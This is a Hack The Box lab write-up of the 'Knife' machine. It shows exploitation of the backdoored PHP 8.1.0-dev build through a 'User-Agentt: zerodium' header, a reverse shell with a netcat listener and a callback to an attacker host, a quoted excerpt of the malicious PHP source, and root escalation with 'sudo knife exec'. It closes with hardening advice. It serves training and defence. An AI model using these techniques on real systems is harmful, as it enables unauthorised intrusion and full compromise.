---
title: "Knife — PHP 8.1.0-dev Backdoor RCE and NOPASSWD knife Escalation"
description: "A backdoored PHP 8.1.0-dev build executes code through the User-Agentt header, and an unrestricted sudo rule for the Chef knife tool is abused via knife exec to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - supply-chain
  - sudo
  - php
objective: "Gain unauthenticated code execution through a backdoored PHP build and escalate to root through a NOPASSWD sudo rule."
tools:
  - nmap
  - curl
  - netcat
  - sudo
  - knife
skill: "PHP 8.1.0-dev backdoor exploitation and NOPASSWD sudo abuse"
outcome: "Unauthenticated remote code execution as the web user, then a root shell via knife exec"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu 20.04) running Apache 2.4.41 and a backdoored PHP 8.1.0-dev build |
| Starting position | Unauthenticated network access |
| Objective | Gain unauthenticated code execution through a backdoored PHP build and escalate to root through a NOPASSWD sudo rule |
| Outcome | Code execution as the web user, then a root shell through `knife exec` |

## Backdoored PHP build to NOPASSWD root

Knife is an Easy-rated Hack The Box Linux machine built on a supply-chain compromise: a backdoor was inserted into the development build of PHP 8.1.0-dev, and any web server running that build evaluates PHP code taken from a malformed `User-Agentt` HTTP header whose value begins with `zerodium`. That gives unauthenticated remote code execution, and a `NOPASSWD` sudo rule on the Chef `knife` binary then converts the foothold into root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). The header payload after the `zerodium` prefix is shown as `<PHP_EXPRESSION>`.

**Attack path:** **Backdoored PHP 8.1.0-dev (`User-Agentt` header) → unauthenticated RCE as `<LAB_USER>` → reverse shell → `NOPASSWD` `/usr/bin/knife` → `knife exec` → root**

## Ubuntu Apache host, unauthenticated, backdoored PHP to root

- **Target:** Linux host (Ubuntu 20.04) exposing SSH (22/tcp) and HTTP (80/tcp). The web tier runs Apache 2.4.41 and serves a sparse medical-company landing page with no interactive features.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** obtain code execution through the backdoored build and escalate to root.
- **Constraints:** activity was confined to the Hack The Box lab environment.

The machine is built on the PHP supply-chain compromise of March 2021. Malicious commits were pushed to the `php/php-src` repository on `git.php.net` after a compromise of the project's git infrastructure, and the changes impersonated trusted maintainers. The injected code checked an incoming request for a header value beginning with `zerodium` and passed the remainder to the PHP evaluator:

```c
if (strstr(Z_STRVAL_P(enc), "zerodium")) {
    zend_try {
        zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "...");
    }
}
```

The backdoor was detected within hours and never entered an official release, but builds compiled from the compromised snapshot, as this lab simulates, remained exploitable. The malformed header is `User-Agentt` (note the doubled `t`), which PHP still processes.

## Evidence: User-Agentt backdoor to NOPASSWD escalation

### 1. Service Enumeration

Observation: a full TCP scan exposes two services.

```bash
nmap -p- --min-rate 10000 -oA nmap/allports <TARGET_IP>
nmap -p 22,80 -sCV -oA nmap/targeted <TARGET_IP>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Significance: HTTP is the only application surface; SSH provides no initial vector and no credentials are supplied.

Result: the target exposes SSH and an Apache web service, so the web tier is the focus.

### 2. HTTP Response Header Fingerprinting

Observation: version identification of the web tier is more revealing than the page content.

```bash
curl -I http://<TARGET_IP>/
```

```text
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

Significance: the `X-Powered-By` header discloses `PHP/8.1.0-dev`. The `-dev` suffix marks a development or pre-release snapshot, specifically the build produced from the compromised 2021 source.

Result: the target runs the backdoored development build of PHP.

### 3. Backdoor Verification

Observation: the backdoor evaluates PHP code from the `User-Agentt` header when its value begins with `zerodium`, so code execution can be confirmed with a benign expression before any shell is spawned.

```bash
curl -s http://<TARGET_IP>/ \
  -H 'User-Agentt: zerodium<PHP_EXPRESSION>;'
```

```text
uid=1000(<LAB_USER>) gid=1000(<LAB_USER>) groups=1000(<LAB_USER>)
```

Significance: the response body returns the output of a shell command executed by the web process, which confirms unauthenticated remote code execution in the context of `<LAB_USER>`.

Result: code execution as the web user is confirmed without authentication.

### 4. Reverse Shell and Interactive Session

Observation: the same execution primitive can return an interactive shell to the attacker.

```bash
nc -lvnp <LISTEN_PORT>
```

```bash
curl -s http://<TARGET_IP>/ \
  -H 'User-Agentt: zerodium<PHP_EXPRESSION>;'
```

```text
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 55806
<LAB_USER>@knife:/$
```

Significance: an interactive foothold removes the need to re-issue single commands through the header and enables local enumeration.

The source records that the session was upgraded to an interactive TTY with a Python `pty` wrapper; no session output accompanies the stabilisation commands, so I could not verify them.

Result: an interactive shell in the context of `<LAB_USER>` is established.

### 5. Sudo Enumeration

Observation: I checked `sudo -l` for the delegations granted to the web user.

```bash
<LAB_USER>@knife:~$ sudo -l
```

```text
User <LAB_USER> may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Significance: `knife` is the Chef command-line tool, an infrastructure-as-code utility that supports executing arbitrary Ruby through its `exec` subcommand. GTFOBins documents `knife exec` as a canonical escalation path; passwordless root execution of a code-capable binary is effectively unrestricted root.

Result: a `NOPASSWD` sudo rule permits running `/usr/bin/knife` as root without a password.

### 6. Privilege Escalation via knife exec

Observation: `knife exec` evaluates a Ruby expression, and Ruby's `exec` replaces the current process image while inheriting its UID/GID. Because `knife` runs under `sudo`, the replacement process runs as root.

```bash
<LAB_USER>@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

```text
root@knife:/home/<LAB_USER># id
uid=0(root) gid=0(root) groups=0(root)
```

Significance: a binary delegated through `NOPASSWD` that can invoke an interpreter turns legitimate administrative delegation into full command execution as root.

Result: the privileged `id` output confirms execution in the root context.

## Challenges and Decisions

The source does not document failed attempts or obstacles for this machine; the path was direct, with the PHP backdoor supplying unauthenticated code execution and the `NOPASSWD` rule supplying escalation.

An alternative escalation was available: `sudo /usr/bin/knife data bag create <NAME> <ITEM> -e vim` opens a data bag in the configured editor, from which a shell escape spawns a root shell. The `knife exec` route was used as the canonical GTFOBins technique.

## Outcome: web user code execution and root shell

The case demonstrates unauthenticated code execution as the web user through the backdoored PHP 8.1.0-dev build and root command execution through the `NOPASSWD` sudo rule on `/usr/bin/knife`. The supply-chain compromise affected only the development snapshot; official PHP releases were never affected.

## Recommendations: dev build, NOPASSWD rules, version disclosure

The actions below remain recommendations; this case study did not test them.

1. **Backdoored development build in production.** The target ran `PHP/8.1.0-dev`, a pre-release snapshot compiled from compromised source, which gave an unauthenticated attacker code execution. *Recommendation:* deploy software only from official, verified release channels and treat any pre-release build string (`-dev`, `-alpha`, `-beta`) as unfit for production. *Detection:* flag pre-release version strings in inventory and monitoring; alert when the unexpected `User-Agentt` header appears.
2. **Unrestricted `NOPASSWD` sudo rules.** Delegating `/usr/bin/knife` without a password allowed the low-privileged user to run arbitrary Ruby as root. *Recommendation:* audit every `NOPASSWD` rule against GTFOBins and scope each rule to the specific subcommands required rather than full binary execution. *Detection:* review sudoers entries, then alert when interpreter-backed binaries run through `sudo`.
3. **Version disclosure in response headers.** `X-Powered-By: PHP/8.1.0-dev` disclosed the vulnerable build with no active probing. *Recommendation:* suppress version banners by setting `expose_php = Off` in `php.ini`, `Header unset X-Powered-By`, and `ServerTokens Prod` in Apache. *Detection:* periodically inspect production response headers for version leakage.

## References

- [Hack The Box — Knife](https://app.hackthebox.com/machines/Knife) (retired machine)
- [PHP internals — php-src git server compromise notice](https://news-web.php.net/php.internals/113838)
- [php-src commit 2b0f239 — malicious backdoor change](https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a)
- [GTFOBins — knife](https://gtfobins.github.io/gtfobins/knife/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [curl — Command line options](https://curl.se/docs/manpage.html)
- [Sudo — sudoers manual](https://www.sudo.ws/docs/man/sudoers.man/)
- [PHP — php.ini core directives (`expose_php`)](https://www.php.net/manual/en/ini.core.php)
- [Apache HTTP Server 2.4 — mod_headers (`Header unset`)](https://httpd.apache.org/docs/2.4/mod/mod_headers.html)
- [Apache HTTP Server 2.4 — core (`ServerTokens`)](https://httpd.apache.org/docs/2.4/mod/core.html)
